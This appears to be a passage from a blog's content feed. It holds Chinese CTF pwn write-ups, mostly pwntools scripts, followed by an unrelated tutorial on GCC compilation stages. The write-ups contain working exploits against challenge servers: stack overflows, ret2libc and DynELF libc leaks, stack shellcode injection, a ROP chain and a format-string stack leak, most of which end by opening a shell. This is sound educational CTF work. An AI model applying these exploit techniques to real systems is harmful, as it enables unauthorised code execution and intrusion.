class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>+p32(system)+p32(main)+p32(binsh)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="jarvisoj-level3"><a href="#jarvisoj-level3" class="headerlink" title="jarvisoj_level3"></a>jarvisoj_level3</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">32</span>位ret2libc</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">conn = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25837</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./level3&#x27;</span>)</span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr = <span class="number">0x0804844B</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span> + <span class="string">b&#x27;b&#x27;</span>*<span class="number">4</span> + p32(write_plt) + p32(main_addr) + p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">4</span>)</span><br><span class="line">conn.sendlineafter(<span class="string">&quot;Input:\n&quot;</span>,payload)</span><br><span class="line">write_addr = u32(conn.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(write_addr))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write_addr)</span><br><span class="line">libc_base = write_addr - libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span> + <span class="string">b&#x27;b&#x27;</span>*<span class="number">4</span> + p32(system_addr) + p32(main_addr) + p32(bin_sh)</span><br><span class="line">conn.sendlineafter(<span class="string">&quot;Input:\n&quot;</span>,payload)</span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="jarvisoj-level4"><a href="#jarvisoj-level4" class="headerlink" title="jarvisoj_level4"></a>jarvisoj_level4</h2><p>学到一个新方法</p>
<p>当题目未提供libc.so的时候，可以使用DynELF寻找我们需要函数的地址，DynELF是通过它有的各种libc.so去爆破该ELF的libc.so。所以需要一个leak函数支持多次的write函数之类的功能,leak的参数addr 是我们需要用write写出数据的地址函数内写&#x2F;接受 4字节8字节都行 返回不需要u32(data) 直接返回data。DynELF(leak,elf&#x3D;elf) 第一个参数就是leak函数 第二个参数是你的程序elf，之后使用lookup(“function_name”,”libc”) function_name就是需要查询的函数真实地址 返回为int，还有一点就是 leak里面返回main有时候行不通 估计是堆栈的原因所以返回start 把所有东西全清空改题构造leak之后 找到system地址通过read 把”&#x2F;bin&#x2F;sh”读到data段 （一般是bss段，不过这里bss段太短了装不下，所以找可执行的data段）注意read的使用要严格控制字符数 也就是第三个参数最开始这里使用了io.sendline(“&#x2F;bin&#x2F;sh\x00”)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28208</span>)</span><br><span class="line"><span class="comment"># io=process(&#x27;./level4&#x27;)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./level4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">start_addr=<span class="number">0x08048350</span></span><br><span class="line">write_plt=<span class="number">0x08048340</span></span><br><span class="line">read_plt=<span class="number">0x08048310</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak</span>(<span class="params">addr</span>):</span><br><span class="line">    payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)+p32(write_plt)+p32(start_addr)</span><br><span class="line">    payload+=p32(<span class="number">1</span>)+p32(addr)+p32(<span class="number">8</span>)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line">    leaked=io.recv(<span class="number">8</span>) <span class="comment"># 8 or 4 try</span></span><br><span class="line">    <span class="comment"># print(&quot;%#x -&gt; %s&quot; %(addr, (context or &#x27;&#x27;).encode(&#x27;hex&#x27;)))</span></span><br><span class="line">    <span class="keyword">return</span> leaked</span><br><span class="line"></span><br><span class="line">d=DynELF(leak,elf=elf)</span><br><span class="line"></span><br><span class="line">system_addr=d.lookup(<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;libc&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;system_addr:&quot;</span>+<span class="built_in">hex</span>(system_addr))</span><br><span class="line"><span class="comment"># read_addr=d.lookup(&#x27;read&#x27;,&#x27;libc&#x27;)</span></span><br><span class="line"><span class="comment"># print &quot;read_addr:&quot;+hex(read_addr)</span></span><br><span class="line"></span><br><span class="line">data_addr=<span class="number">0x0804A01C</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)+p32(read_plt)+p32(start_addr)</span><br><span class="line">payload+=p32(<span class="number">0</span>)+p32(data_addr)+p32(<span class="number">8</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.send(<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"><span class="comment">#io.sendline(&quot;/bin/sh\x00&quot;) wrong!!!</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)+p32(system_addr)+p32(start_addr)</span><br><span class="line">payload+=p32(data_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p> 泄露还可以用LibcSearcher 只要得到一个函数的真实地址，就可以dump出libc地址然后类似于给出了libc一样计算base_addr 继而计算其他函数的真实地址两种方法都可能得到错误的libc.so ,这道题，我用LibcSearcher就打不通</p>
<h2 id="ez-pz-hackover-2016"><a href="#ez-pz-hackover-2016" class="headerlink" title="ez_pz_hackover_2016"></a>ez_pz_hackover_2016</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">调试脚本</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">from pwn import *</span></span><br><span class="line"><span class="string">context(log_level = &#x27;debug&#x27;,os=&#x27;linux&#x27;,arch=&#x27;i386&#x27;)</span></span><br><span class="line"><span class="string">p = process(&#x27;./ez&#x27;)</span></span><br><span class="line"><span class="string">gdb.attach(p)</span></span><br><span class="line"><span class="string">p.recvuntil(&#x27;crash: &#x27;)</span></span><br><span class="line"><span class="string">stack_addr = int(p.recv(10), 16)</span></span><br><span class="line"><span class="string">payload = b&#x27;crashme\x00&#x27; + b&#x27;a&#x27;*18 </span></span><br><span class="line"><span class="string">payload += p32(0) + asm(shellcraft.sh())</span></span><br><span class="line"><span class="string">p.recvuntil(&#x27;&gt; &#x27;)</span></span><br><span class="line"><span class="string">p.sendline(payload)</span></span><br><span class="line"><span class="string">pause()</span></span><br><span class="line"><span class="string">p.interactive()</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25049</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">p.recvuntil(<span class="string">&#x27;lets crash: &#x27;</span>)</span><br><span class="line">stack_addr = <span class="built_in">int</span>(p.recv(<span class="number">10</span>),<span class="number">16</span>)</span><br><span class="line">shellcode_addr = stack_addr-<span class="number">28</span></span><br><span class="line">payload = <span class="string">b&#x27;crashme\x00&#x27;</span>.ljust(<span class="number">26</span>,<span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">payload += p32(shellcode_addr)+shellcode</span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="picoctf-2018-rop-chain"><a href="#picoctf-2018-rop-chain" class="headerlink" title="picoctf_2018_rop chain"></a>picoctf_2018_rop chain</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27550</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./rop_chain&#x27;</span>)</span><br><span class="line">flag_addr=elf.symbols[<span class="string">&#x27;flag&#x27;</span>]</span><br><span class="line">win1_addr=elf.symbols[<span class="string">&#x27;win_function1&#x27;</span>]</span><br><span class="line">win2_addr=elf.symbols[<span class="string">&#x27;win_function2&#x27;</span>]</span><br><span class="line">win2_a1=<span class="number">0xBAAAAAAD</span><span class="comment">#-1163220307十六进制补码</span></span><br><span class="line">flag_a1=<span class="number">0xDEADBAAD</span><span class="comment">#-559039827十六进制补码</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x18</span>+<span class="number">4</span>)+p32(win1_addr)+p32(win2_addr)+p32(flag_addr)+p32(win2_a1)+p32(flag_a1)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="HUBUCTF-2022-新生赛-fmt"><a href="#HUBUCTF-2022-新生赛-fmt" class="headerlink" title="[HUBUCTF 2022 新生赛]fmt"></a>[HUBUCTF 2022 新生赛]fmt</h2><p>这道题实现了BROP的思想，利用格式化字符串漏洞泄露目标程序的栈中的信息，并通过多次利用格式化字符串漏洞，逐步获取flag。遇到的很少所以记录一下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=remote(<span class="string">&#x27;node2.anna.nssctf.cn&#x27;</span>,<span class="number">28231</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./fmt&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_flag</span>(<span class="params">k</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;service&#x27;</span>,k)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">    a=p.recvline()[:-<span class="number">1</span>][::-<span class="number">1</span>]</span><br><span class="line">    f=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(a),<span class="number">2</span>):</span><br><span class="line">        f+=<span class="built_in">chr</span>(<span class="built_in">int</span>(a[i:i+<span class="number">2</span>][::-<span class="number">1</span>],<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> f</span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>,<span class="number">20</span>):</span><br><span class="line">    flag+=get_flag(<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(i).encode()+<span class="string">b&#x27;$p&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;flag=&#x27;</span>+flag) </span><br></pre></td></tr></table></figure>

<p>get_flag函数接受一个参数 k，向目标程序发送一个字符串（请求），并根据目标程序的响应获取 flag 的值。在这个函数中，先将 k 发送给目标程序，然后获取响应中 0x 开头的字符串（栈中地址），将该字符串逆序（[::-1]）后截断去掉换行符，再按照每两个字符转换成相应的 ascii 码，并组成新的字符串 f 返回。</p>
<p>for 循环从 12 到 19，每次将一个参数中的某一个参数设置成 fmt 字符串的参数位置（如12$p’、13$p’），然后调用 get_flag() 函数获取返回值，并将返回值添加到 flag 中。</p>
<h2 id="2021-鹤城杯-babyof"><a href="#2021-鹤城杯-babyof" class="headerlink" title="[2021 鹤城杯]babyof"></a>[2021 鹤城杯]babyof</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;1.14.71.254&#x27;</span>,<span class="number">28597</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.27.so&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;babyof&#x27;</span>)</span><br><span class="line">ret = <span class="number">0x0000000000400506</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000400743</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main = <span class="number">0x40066B</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;?&quot;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x40</span> + p64(<span class="number">0</span>) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) +p64(main)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">binsh = libc_base + <span class="number">0x00000000001b3e1a</span></span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">p.recvuntil(<span class="string">&quot;?&quot;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x40</span> + p64(<span class="number">0</span>) +  p64(ret) +p64(pop_rdi) + p64(binsh) + p64(system)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="WUSTCTF-2020-getshell2"><a href="#WUSTCTF-2020-getshell2" class="headerlink" title="[WUSTCTF 2020]getshell2"></a>[WUSTCTF 2020]getshell2</h2><p>tips: p32(system_plt) + p32(0) + p32(str_binsh) 可以替换成 p32(call_system) + p32(str_sh)<br> 这是因为 call system 指令执行后会被当前 eip 寄存器的值压栈，所以在 p32(system_plt) + p32(0) +  p32(str_binsh) 中我们用 p32(0) 作为 eip 寄存器的值进入栈中。那么我们使用 call system 指令的时候就不需要 p32(0) 作为 eip 寄存器的值进入栈中（call system 指令会自动实现将当前 eip  寄存器的值压栈），所以该指令后面直接跟参数<br> 同样的，在 linux 中，&#x2F;bin&#x2F;sh 是二进制文件，而 sh 是环境变量，相当于执行 &#x2F;bin&#x2F;sh</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=remote(<span class="string">&#x27;node3.anna.nssctf.cn&#x27;</span>,<span class="number">28711</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./service&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x1c</span> + p32(<span class="number">0x08048529</span>) + p32(<span class="built_in">next</span>(elf.search(<span class="string">b&#x27;sh\x00&#x27;</span>)))</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>





]]></content>
      <categories>
        <category>刷题总结</category>
      </categories>
      <tags>
        <tag>刷题</tag>
      </tags>
  </entry>
  <entry>
    <title>GNU Makefile编译C/C++(Linux系统、VSCODE)</title>
    <url>/2023/04/17/GNU-Makefile%E7%BC%96%E8%AF%91C-C-Linux%E7%B3%BB%E7%BB%9F%E3%80%81VSCODE/</url>
    <content><![CDATA[<p><a href="https://github.com/liheqian1993/GNC-Tutorial">文章改动</a></p>
<h1 id="GCC简介"><a href="#GCC简介" class="headerlink" title="GCC简介"></a>GCC简介</h1><p><a href="https://gcc.gnu.org/onlinedocs/">GCC 官方文档网站</a></p>
<p>GCC（GNU Compiler Collection，GNU编译程序集合）是最重要的开放源码软件。其他所有开放源码软件都在某种层次上依赖于它。甚至其他语言，例如 Python，都是由 C 语言开发的，由 GNU 编译程序编译的。这个软件对于整个自由软件运动而言具有根本性的意义。如果没有它或类似的软件，就不可能有自由软件运动。GCC 为 Linux 的出现提供了可能性。GCC 是由许多组件组成的，但它们也并不总是出现的。有些部分是和语言相关的，所以如果没有安装某种特定语言，系统中就不会出现相关的文件。</p>
<p><strong>常见组成部分</strong> </p>
<ul>
<li><strong>c++：</strong> gcc 的一个版本，默认语言设置为 C++，而且在链接的时候自动包含标准 C++ 库。这和 g++ 一样</li>
<li><strong>configure：</strong> GCC 源代码树根目录中的一个脚本。用于设置配置值和创建 GCC 编译程序必需的 make 程序文件</li>
<li><strong>g++：</strong> gcc 的一个版本，默认语言设置为 C++，而且在链接的时候自动包含标准 C++库。这和 c++ 一样</li>
<li><strong>gcc：</strong> 该驱动程序等同于执行编译程序和连接程序以产生需要的输出</li>
<li><strong>libgcc：</strong> 该库包含的例程被作为编译程序的一部分，是因为它们可被链接到实际的可执行程序中。它们是特殊的例程，链接到可执行程序，来执行基本的任务，例如浮点运算。这些库中的例程通常都是平台相关的</li>
<li><strong>libstdc++：</strong> 运行时库，包括定义为标准语言一部分的所有的 C++类和函数</li>
</ul>
<p><strong>包含的常见软件</strong></p>
<ul>
<li><strong>ar：</strong> 这是一个程序，可通过从文档中增加、删除和析取文件来维护库文件。通常使用该工具是为了创建和管理连接程序使用的目标库文档。该程序是 binutils 包的一部分</li>
<li><strong>as：</strong> GNU 汇编器。实际上它是一族汇编器，因为它可以被编译或能够在各种不同平台上工作。该程序是 binutjls 包的一部分 autoconf：产生的 shell 脚本自动配置源代码包去编译某个特定版本的 UNIX</li>
<li><strong>gdb：</strong> GNU 调试器，可用于检查程序运行时的值和行为 GNATS：GNU 的调试跟踪系统（GNU Bug Tracking System）。一个跟踪 GCC和其他 GNU 软件问题的在线系统</li>
<li><strong>gprof：</strong> 该程序会监督编译程序的执行过程，并报告程序中各个函数的运行时间，可以根据所提供的配置文件来优化程序。该程序是 binutils 包的一部分</li>
<li><strong>ld：</strong> GNU 连接程序。该程序将目标文件的集合组合成可执行程序。该程序是 binutils 包的一部分</li>
<li><strong>libtool：</strong> 一个基本库，支持 make 程序的描述文件使用的简化共享库用法的脚本</li>
<li><strong>make：</strong> 一个工具程序，它会读 makefile 脚本来确定程序中的哪个部分需要编译和连接，然后发布必要的命令。它读出的脚本（叫做 makefile 或 Makefile）定义了文件关系和依赖关系</li>
</ul>
<p><strong>GCC默认头文件搜索路径</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> | gcc -v -x c -E -</span><br></pre></td></tr></table></figure>

<ul>
<li>&#x2F;usr&#x2F;lib&#x2F;gcc&#x2F;x86_64-linux-gnu&#x2F;7&#x2F;include</li>
<li>&#x2F;usr&#x2F;local&#x2F;include</li>
<li>&#x2F;usr&#x2F;lib&#x2F;gcc&#x2F;x86_64-linux-gnu&#x2F;7&#x2F;include-fixed</li>
<li>&#x2F;usr&#x2F;include&#x2F;x86_64-linux-gnu</li>
<li>&#x2F;usr&#x2F;include</li>
</ul>
<h1 id="简单编译原理"><a href="#简单编译原理" class="headerlink" title="简单编译原理"></a>简单编译原理</h1><h2 id="1-hello-world在计算机的表示"><a href="#1-hello-world在计算机的表示" class="headerlink" title="1 hello, world在计算机的表示"></a>1 hello, world在计算机的表示</h2><p>hello 程序的生命周期是从一个源程序（或者说源文件）开始的，程序员通过编辑器创建并保存的文本文件，文件名是 hello.c。源程序实际上就是一个由值 0 和 1组成的位（又称为比特）序列，8 个位被组织成一组，称为字节。每个字节表示程序中的某些文本字符</p>
<p>大部分计算机使用 ASCII 标准来表示文本字符</p>
<ul>
<li>用一个唯一的单字节大小的整数值息来表示每个字符</li>
<li>hello.c 程序是以字节序列的方式储存在文件中的</li>
</ul>
<p>hello.c 的表示方法说明了一个基本思想∶ 系统中所有的信息——包括磁盘文件、内存中的程序、内存中存放的用户数据以及网络上传送的数据，都是由一串比特表示</p>
<p>![img](<a href="https://cdn.jsdelivr.net/gh/jangfan/picb@main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE">https://cdn.jsdelivr.net/gh/jangfan/picb@main/屏幕截图</a> 2023-04-17 102936.png)</p>
<h2 id="2-编译过程"><a href="#2-编译过程" class="headerlink" title="2 编译过程"></a>2 编译过程</h2><p>hello 程序的生命周期从一个高级 C 语言程序开始</p>
<p>为了在系统上运行 hello.c 程序，每条 C 语句都必须被其他程序转化为一系列的低级机器语言指令</p>
<p>然后这些指令按照一种称为可执行目标程序的格式打好包，并以二进制磁盘文件的形式存放起来</p>
<p>GCC 编译器读取源程序文件 hello.c，并把它翻译成一个可执行目标文件 hello。这个翻译过程可分为四个阶段完成，如下图所示</p>
<p>执行这四个阶段的程序（预处理器、编译器、汇编器和链接器）一起构成了编译系统（compilation system）</p>
<p>![img](<a href="https://cdn.jsdelivr.net/gh/jangfan/picb@main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE">https://cdn.jsdelivr.net/gh/jangfan/picb@main/屏幕截图</a> 2023-04-17 102947.png)</p>
<p> </p>
<h3 id="2-1-预处理阶段"><a href="#2-1-预处理阶段" class="headerlink" title="2.1 预处理阶段"></a>2.1 预处理阶段</h3><p><code>预处理器（cpp）</code>根据以字符#开头的命令，修改原始的 C 程序。比如 hello.c中第 1行的#include &lt; stdio.h&gt;命令告诉<strong>预处理器读取系统头文件 stdio.h 的内容，并把它直接插入程序文本中。</strong>结果就得到了另一个 C程序，通常是以.i作为文件扩展名。</p>
<h3 id="2-2-编译阶段"><a href="#2-2-编译阶段" class="headerlink" title="2.2 编译阶段"></a>2.2 编译阶段</h3><p><code>编译器（ccl）</code>将文本文件 hello.i翻译成文本文件 hello.s，它包含一 个汇编语言程序。该程序包含函数 main 的定义，如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">main:</span><br><span class="line">subq    $8, %rsp </span><br><span class="line">mov1    $.LCO,%edi </span><br><span class="line">call    puts </span><br><span class="line">mov1    $0,%eax </span><br><span class="line">addq    $8,%rsp </span><br><span class="line">ret</span><br></pre></td></tr></table></figure>

<p>每条语句都以一种文本格式描述了一条低级机器语言指令。汇编语言非常有用，它为不同高级语言的不同编译器提供了通用的输出语言</p>
<h3 id="2-3-汇编阶段"><a href="#2-3-汇编阶段" class="headerlink" title="2.3 汇编阶段"></a>2.3 汇编阶段</h3><p><code>汇编器（as）</code>将 hello.s 翻译成机器语言指令，把这些指令打包成一种叫做可重定位目标程序（relocatable object program）的格式，并将结果保存在目标文件 hello.o中。</p>
<p>hello.o 文件是一个二进制文件，它包含的17 个字节是函数 main的指令编码。如果我们在文本编辑器中打开 hello.o文件，将看到一堆乱码。</p>
<h3 id="2-4-链接阶段"><a href="#2-4-链接阶段" class="headerlink" title="2.4 链接阶段"></a>2.4 链接阶段</h3><p>注意，hello程序调用了 printf 函数，它是每个 C 编译器都提供的标准 C 库中的一个函数。printf 函数存在于一个名为 printf.o 的单独的预编译好了的目标文件中，而这个文件必须以某种方式合并到我们的 hello.o 程序中。</p>
<p><code>链接器（ld）</code>就负责处理这种合并。结果就得到 hello 文件，它是一个可执行目标文件（或者简称为可执行文件），可以被加载到内存中，由系统执行。</p>
<h2 id="3-hello-world的执行过程"><a href="#3-hello-world的执行过程" class="headerlink" title="3 hello, world的执行过程"></a>3 hello, world的执行过程</h2><h3 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h3><ul>
<li>shell 等待我们输入一个命令</li>
<li>当我们在键盘上输入字符串”.&#x2F;hello”（注意这里是编译好的可执行目标文件）后</li>
<li>shell 程序将字符逐一读入寄存器</li>
<li>再把它存放到内存中</li>
</ul>
<p>![img](<a href="https://cdn.jsdelivr.net/gh/jangfan/picb@main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE">https://cdn.jsdelivr.net/gh/jangfan/picb@main/屏幕截图</a> 2023-04-17 102955.png)</p>
<p> </p>
<h3 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h3><ul>
<li>当我们在键盘上敲回车键时，shell 程序就知道我们已经结束了命令的输人</li>
<li>然后 shell 执行一系列指令来加载可执行的 hello 文件</li>
<li>这些指令将 hello 目标文件中的代码和数据从磁盘复制到主存</li>
<li>数据包括最终会被输出的字符串”hello，world\n”。</li>
</ul>
<p>![img](<a href="https://cdn.jsdelivr.net/gh/jangfan/picb@main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE">https://cdn.jsdelivr.net/gh/jangfan/picb@main/屏幕截图</a> 2023-04-17 103000.png)</p>
<p> </p>
<h3 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a>第三步</h3><ul>
<li>一旦目标文件 hello 中的代码和数据被加载到主存</li>
<li>处理器就开始执行 hello 程序的 main 程序中的机器语言指令</li>
<li>这些指令将 “hello，world\n” 字符串中的字节从主存复制到寄存器文件</li>
<li>再从寄存器文件中复制到显示设备，最终显示在屏幕上</li>
</ul>
<p>![img](<a href="https://cdn.jsdelivr.net/gh/jangfan/picb@main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE">https://cdn.jsdelivr.net/gh/jangfan/picb@main/屏幕截图</a> 2023-04-17 103005.png)</p>
<p> </p>
<p> </p>
<h2 id="4-程序在计算机内的存储"><a href="#4-程序在计算机内的存储" class="headerlink" title="4 程序在计算机内的存储"></a>4 程序在计算机内的存储</h2><ul>
<li>hello程序的机器指令最初是存放在磁盘上</li>
<li>当程序加载时，它们被复制到主存</li>
<li>当处理器运行程序时，指令又从主存复制到处理器</li>
</ul>
<p>相似地，数据串 “hello，world\n”开始时在磁盘上，然后被复制到主存，最后从主存上复制到显示设备</p>
<h1 id="C语言的编译"><a href="#C语言的编译" class="headerlink" title="C语言的编译"></a>C语言的编译</h1><p>编译 C 语言相关的后缀</p>
<blockquote>
<p>.a 静态库文件</p>
<p>.c 源文件</p>
<p>.h 头文件</p>
<p>.i  预处理文件</p>
<p>.o 目标文件</p>
<p>.s 汇编语言文件</p>
<p>.so 动态库 共享库有 运行时库 文件</p>
</blockquote>
<h2 id="2-Compiling-C"><a href="#2-Compiling-C" class="headerlink" title="2 Compiling C"></a>2 Compiling C</h2><h3 id="2-1-Preprocessing"><a href="#2-1-Preprocessing" class="headerlink" title="2.1 Preprocessing"></a>2.1 Preprocessing</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">不会生成 .i 文件</span></span><br><span class="line">gcc -E main.c</span><br><span class="line">gcc -E main.c -o helloworld.i</span><br></pre></td></tr></table></figure>

<ul>
<li>-E 选项告诉编译器只进行预处理操作</li>
<li>-o 选项把预处理的结果输出到指定文件</li>
</ul>
<p> </p>
<h3 id="2-2-Generating-Assembly-Language"><a href="#2-2-Generating-Assembly-Language" class="headerlink" title="2.2 Generating Assembly Language"></a>2.2 Generating Assembly Language</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -S main.c</span><br><span class="line">gcc -S main.c -o xxx.s</span><br></pre></td></tr></table></figure>

<ul>
<li>-S 选项告诉编译器，进行预处理和编译成汇编语言操作</li>
</ul>
<p>每个平台对应的汇编语言的形式是不同的，例如有很多型号的开发板，有很多型号的 CPU</p>
<h3 id="2-3-Source-File-to-Object-File"><a href="#2-3-Source-File-to-Object-File" class="headerlink" title="2.3 Source File to Object File"></a>2.3 Source File to Object File</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -c main.c</span><br><span class="line">gcc -c main.c -o xxx.o</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">编译多个 .c 文件</span></span><br><span class="line">gcc -c main.c add.c minus.c</span><br></pre></td></tr></table></figure>

<h3 id="2-4-Single-Source-to-Executable"><a href="#2-4-Single-Source-to-Executable" class="headerlink" title="2.4 Single Source to Executable"></a>2.4 Single Source to Executable</h3><ul>
<li>注意：后面三个命令执行后并没有按编译过程出现 .i .s 或 .o 文件，并不意味着没有经历这些过程</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc main.c</span><br><span class="line">gcc main.c -o xxx</span><br></pre></td></tr></table></figure>

<p>执行程序</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./可执行文件</span><br></pre></td></tr></table></figure>

<h3 id="2-5-Multiple-Sources-to-Executable"><a href="#2-5-Multiple-Sources-to-Executable" class="headerlink" title="2.5 Multiple Sources to Executable"></a>2.5 Multiple Sources to Executable</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gcc main.c add.c minus.c -o exec</span><br><span class="line">./exec</span><br></pre></td></tr></table></figure>

